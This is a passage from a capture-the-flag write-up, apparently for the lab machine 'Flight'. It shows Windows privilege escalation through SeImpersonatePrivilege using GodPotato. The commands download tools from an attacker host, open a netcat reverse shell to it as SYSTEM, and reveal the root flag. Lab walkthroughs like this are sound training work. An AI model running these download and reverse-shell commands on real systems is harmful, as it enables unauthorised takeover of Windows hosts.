+</code></pre><h3 id="19fd1b9f-8847-80e7-86b0-de785e963f06" class="">Use privescchek.ps1 to know paths to privesc</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-80e2-9ed8-c0052a8def1c" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">PS C:\inetpub\development&gt; . .\PrivescCheck.ps1
+. .\PrivescCheck.ps1
+PS C:\inetpub\development&gt; Invoke-PrivescCheck
+[*] Status: Informational - Severity: None - Execution time: 00:00:00.122
+
+
+????????????????????????????????????????????????????????????????
+? CATEGORY ? TA0004 - Privilege Escalation                     ?
+? NAME     ? User privileges                                   ?
+? TYPE     ? Base                                              ?
+????????????????????????????????????????????????????????????????
+? Check whether the current user is granted privileges that    ?
+? can be leveraged for local privilege escalation.             ?
+????????????????????????????????????????????????????????????????
+
+Name                          State    Description                               Exploitable
+----                          -----    -----------                               -----------
+SeAssignPrimaryTokenPrivilege Disabled Replace a process-level token                    True
+SeIncreaseQuotaPrivilege      Disabled Adjust memory quotas for a process              False
+SeMachineAccountPrivilege     Disabled Add workstations to domain                      False
+SeAuditPrivilege              Disabled Generate security audits                        False
+SeChangeNotifyPrivilege       Enabled  Bypass traverse checking                        False
+SeImpersonatePrivilege        Enabled  Impersonate a client after authentication        True
+
+</code></pre><h3 id="19fd1b9f-8847-8096-9e89-c004c7838e84" class="">Use SeImpersonatePrivilege → Searching <a href="https://www.plesk.com/kb/support/microsoft-windows-seimpersonateprivilege-local-privilege-escalation/">https://www.plesk.com/kb/support/microsoft-windows-seimpersonateprivilege-local-privilege-escalation/</a></h3><p id="19fd1b9f-8847-80cf-a1a6-dda310d76932" class="">Let’s use the first <a href="https://github.com/BeichenDream/GodPotato">GodPotato</a> to explot it</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-8021-9bc3-e89b4e45229f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">c:\Windows\Temp&gt;powershell -c wget http://10.10.14.4:8002/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
+powershell -c wget http://10.10.14.4:8002/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
+
+c:\Windows\Temp&gt;powershell -c wget http://10.10.14.4:8002/nc64.exe -Outfile nc64.exe
+powershell -c wget http://10.10.14.4:8002/nc64.exe -Outfile nc64.exe
+
+c:\Windows\Temp&gt;.\GodPotato-NET4.exe -cmd &quot;.\nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.4 1210&quot;
+.\GodPotato-NET4.exe -cmd &quot;.\nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.4 1210&quot;
+[*] CombaseModule: 0x140731394818048
+[*] DispatchTable: 0x140731397124160
+[*] UseProtseqFunction: 0x140731396500688
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\edc362e8-f020-49d8-bb4b-f2fe4879fefc\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000cc02-11b8-ffff-9ac0-8b6db39f5ee4
+[*] DCOM obj OXID: 0x13700fb3f4fc5c2b
+[*] DCOM obj OID: 0x346c1cc0174e5b5f
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 912 Token:0x816  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 4492
+
+</code></pre><h3 id="1a0d1b9f-8847-807a-9955-d6bde405f28d" class="">NC listener I got shell</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a0d1b9f-8847-8011-8ba2-cb5a1fd60005" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ nc -lnvp 1210
+listening on [any] 1210 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.11.187] 49792
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\Windows\Temp&gt;whoami
+whoami
+nt authority\system
+c:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+255e0e9592657e700c4aac7da1320c4b
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
